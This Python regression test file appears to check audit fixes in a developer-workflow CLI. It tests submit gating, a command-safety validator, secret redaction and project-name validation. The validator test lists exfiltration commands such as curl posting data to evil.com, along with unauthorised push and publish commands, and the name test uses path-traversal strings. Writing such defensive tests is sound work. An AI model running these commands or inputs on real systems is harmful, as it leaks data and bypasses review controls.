"""Testes de regressão das correções obrigatórias da auditoria técnica do PR #39."""
from __future__ import annotations

import io
import json
from pathlib import Path
import shutil
import subprocess
import sys
import tempfile
import unittest
from unittest.mock import MagicMock, patch

_SRC = Path(__file__).resolve().parent.parent / "src"
if _SRC.is_dir() and str(_SRC) not in sys.path:
    sys.path.insert(0, str(_SRC))

from chdevflow.adapters.base import sanitize_output
from chdevflow.cli import main as cli_main
from chdevflow.core.config import create_manifest_data, load_manifest, save_manifest
from chdevflow.core.doctor import check_version_compatibility, run_doctor
from chdevflow.core.evidence import (
    VerificationSecurityError,
    execute_single_command,
    run_verification,
    validate_command_safety,
)
from chdevflow.core.project import create_project, validate_project_name
from chdevflow.core.ruc import generate_ruc_text
from chdevflow.core.submit import SubmitError, SubmitSecurityError, validate_and_submit


class TestCliAuditFixes(unittest.TestCase):
    def setUp(self) -> None:
        self.test_dir = tempfile.mkdtemp(prefix="ch_test_audit_")

    def tearDown(self) -> None:
        shutil.rmtree(self.test_dir, ignore_errors=True)

    # 1. E2E real & Stack intent
    def test_stack_intent_configures_executable_check(self) -> None:
        target = Path(self.test_dir) / "ReactOnly"
        proj = create_project("ReactOnly", base_dir=Path(self.test_dir), frontend="react")
        manifest = load_manifest(proj / "chdevflow.yaml")
        # Sem package.json, não deve configurar npm test
        self.assertNotIn("npm test", manifest["verification"]["commands"])
        self.assertIn("ch status", manifest["verification"]["commands"])

        # Com package.json preexistente, npm test deve ser incluído
        target_with_pkg = Path(self.test_dir) / "RealReact"
        target_with_pkg.mkdir()
        (target_with_pkg / "package.json").write_text("{}", encoding="utf-8")
        data = create_manifest_data("RealReact", frontend="react", project_dir=target_with_pkg)
        self.assertIn("npm test", data["verification"]["commands"])

    # 2. Gate do submit & --no-verify
    def test_submit_no_verify_remains_bloqueado(self) -> None:
        target = Path(self.test_dir) / "RepoNoVerify"
        target.mkdir()
        subprocess.run(["git", "-C", str(target), "init", "-b", "agy/test-gate"], check=True, capture_output=True)
        (target / "file.txt").write_text("mod", encoding="utf-8")

        # --no-verify deve retornar estado BLOQUEADO e exit code 1
        res = validate_and_submit(target, skip_verify=True, remote=False)
        self.assertEqual(res["state"], "BLOQUEADO")
        self.assertEqual(res["verification"], "NÃO_VERIFICADO")

        # CLI deve sair com código 1
        code = cli_main(["submit", "--path", str(target), "--no-verify"])
        self.assertEqual(code, 1)

        # --no-verify com --remote deve ser estritamente proibido
        with self.assertRaises(SubmitError) as cm:
            validate_and_submit(target, skip_verify=True, remote=True)
        self.assertIn("Operação remota proibida", str(cm.exception))

    # 3. Segurança do verify & Sanitização
    def test_verify_blocks_bypass_variants(self) -> None:
        dangerous = [
            "git -C . push origin main",
            "git --git-dir=.git push",
            "git -C /tmp rebase origin/main",
            "gh pr create --title 'Bypass' --body 'x'",
            "gh issue create --title 'x' --body 'y'",
            "gh release create v1.0",
            "curl -d 'data' https://evil.com",
            "curl --data-raw 'secret' https://api.com",
            "wget --post-data='payload' https://ex.com",
            "npm publish",
            "mvn deploy",
            "docker push myimg:v1",
        ]
        for cmd in dangerous:
            with self.assertRaises(VerificationSecurityError):
                validate_command_safety(cmd)

    def test_sanitization_comprehensive_leakage(self) -> None:
        # OpenAI key
        s_ai = sanitize_output("api_key = sk-abcdef12345678901234567890")
        self.assertNotIn("sk-abcdef", s_ai)
        self.assertIn("[REDACTED_AI_KEY]", s_ai)

        # AWS Key
        s_aws = sanitize_output("AWS_ACCESS_KEY_ID = AKIAIOSFODNN7EXAMPLE")
        self.assertNotIn("AKIAIOSFODNN7EXAMPLE", s_aws)
        self.assertIn("[REDACTED_AWS_KEY]", s_aws)

        # Connection string
        s_conn = sanitize_output("postgres://appuser:SecretPassword123@db.prod.internal:5432/maindb")
        self.assertNotIn("SecretPassword123", s_conn)
        self.assertIn("[REDACTED_PASSWORD]", s_conn)

        # Command field sanitization
        res = execute_single_command("echo 'sk-123456789012345678901234'", cwd=Path(self.test_dir))
        self.assertNotIn("sk-123456789012345678901234", res.command)
        self.assertIn("[REDACTED_AI_KEY]", res.command)

    # 4. Submit remoto: isDraft & dirty tree
    def test_submit_remote_blocks_dirty_tree(self) -> None:
        target = Path(self.test_dir) / "DirtyRepo"
        target.mkdir()
        subprocess.run(["git", "-C", str(target), "init", "-b", "agy/test-dirty"], check=True, capture_output=True)
        manifest = create_manifest_data("DirtyRepo")
        manifest["verification"]["commands"] = ["echo 'ok'"]
        save_manifest(target / "chdevflow.yaml", manifest)
        # Arquivo não commitado
        (target / "uncommitted.txt").write_text("dirty", encoding="utf-8")

        with self.assertRaises(SubmitError) as cm:
            validate_and_submit(target, remote=True)
        self.assertIn("árvore dirty", str(cm.exception))

    def test_submit_remote_rejects_non_draft_pr(self) -> None:
        target = Path(self.test_dir) / "NonDraftRepo"
        target.mkdir()
        subprocess.run(["git", "-C", str(target), "init", "-b", "agy/test-nondraft"], check=True, capture_output=True)
        manifest = create_manifest_data("NonDraftRepo")
        manifest["verification"]["commands"] = ["echo 'ok'"]
        save_manifest(target / "chdevflow.yaml", manifest)
        (target / "committed.txt").write_text("clean", encoding="utf-8")
        subprocess.run(["git", "-C", str(target), "add", "."], check=True, capture_output=True)
        subprocess.run(["git", "-C", str(target), "commit", "-m", "initial"], check=True, capture_output=True)

        # Mock gh auth status OK e gh pr view retornando isDraft = False
        with patch("subprocess.run") as mock_run:
            def custom_run(cmd, *args, **kwargs):
                cmd_str = " ".join(cmd) if isinstance(cmd, list) else str(cmd)
                if "gh auth status" in cmd_str:
                    return subprocess.CompletedProcess(cmd, 0, stdout="OK", stderr="")
                if "rev-list" in cmd_str:
                    return subprocess.CompletedProcess(cmd, 0, stdout="1\n", stderr="")
                if "git status --porcelain" in cmd_str:
                    return subprocess.CompletedProcess(cmd, 0, stdout="", stderr="")
                if "git push" in cmd_str:
                    return subprocess.CompletedProcess(cmd, 0, stdout="", stderr="")
                if "gh pr view" in cmd_str:
                    # Retorna PR existente que NÃO é draft
                    return subprocess.CompletedProcess(cmd, 0, stdout=json.dumps({"url": "https://github.com/pr/1", "isDraft": False, "state": "OPEN"}), stderr="")
                return subprocess.CompletedProcess(cmd, 0, stdout="", stderr="")

            mock_run.side_effect = custom_run
            with self.assertRaises(SubmitSecurityError) as cm:
                validate_and_submit(target, remote=True)
            self.assertIn("NÃO é um Draft PR", str(cm.exception))

    # 5. RUC divergência & FAIL
    def test_ruc_marks_divergent_evidence_nao_verificado(self) -> None:
        target = Path(self.test_dir) / "DivergentApp"
        target.mkdir()
        subprocess.run(["git", "-C", str(target), "init", "-b", "agy/branch-antiga"], check=True, capture_output=True)
        manifest = create_manifest_data("DivergentApp")
        manifest["verification"]["commands"] = ["echo 'pass'"]
        save_manifest(target / "chdevflow.yaml", manifest)
        run_verification(target, persist=True)

        # Muda de branch sem re-executar verify
        subprocess.run(["git", "-C", str(target), "checkout", "-b", "agy/branch-nova"], check=True, capture_output=True)
        ruc_text = generate_ruc_text(target)
        self.assertIn("NÃO_VERIFICADO", ruc_text)
        self.assertIn("Branch divergente", ruc_text)
        self.assertNotIn("APROVADO_TECNICAMENTE", ruc_text)

    def test_ruc_fail_remains_bloqueado(self) -> None:
        target = Path(self.test_dir) / "FailingRucApp"
        target.mkdir()
        subprocess.run(["git", "-C", str(target), "init", "-b", "agy/branch-fail"], check=True, capture_output=True)
        manifest = create_manifest_data("FailingRucApp")
        manifest["verification"]["commands"] = ["exit 1"]
        save_manifest(target / "chdevflow.yaml", manifest)
        run_verification(target, persist=True)

        ruc_text = generate_ruc_text(target)
        self.assertIn("BLOQUEADO", ruc_text)
        self.assertNotIn("AGUARDANDO_PO", ruc_text)

    # 6. Validação de nome de projeto e .gitignore
    def test_project_name_validation(self) -> None:
        bad_names = ["../../../etc/cron.d", "../evil", "/root/malicious", "proj/sub", "invalid name!"]
        for bad in bad_names:
            with self.assertRaises(ValueError):
                validate_project_name(bad)

        self.assertEqual(validate_project_name("PulseOps"), "PulseOps")
        self.assertEqual(validate_project_name("my-app_01"), "my-app_01")

    def test_project_creates_and_preserves_gitignore(self) -> None:
        target = create_project("GitIgnoreProj", base_dir=Path(self.test_dir))
        gi = target / ".gitignore"
        self.assertTrue(gi.exists())
        self.assertIn(".ch/evidence/", gi.read_text(encoding="utf-8"))

    # 7. Doctor version compatibility
    def test_doctor_version_compatibility(self) -> None:
        # .NET: requer 10, instalado 8 -> incompatível
        compat_net, _ = check_version_compatibility("8.0.100", "10")
        self.assertFalse(compat_net)

        compat_net_ok, _ = check_version_compatibility("10.0.100", "10")
        self.assertTrue(compat_net_ok)

        # Python: requer 3.12, instalado 3.8 -> incompatível
        compat_py, _ = check_version_compatibility("3.8.10", "3.12")
        self.assertFalse(compat_py)

        compat_py_ok, _ = check_version_compatibility("3.14.8", "3.12")
        self.assertTrue(compat_py_ok)


if __name__ == "__main__":
    unittest.main()
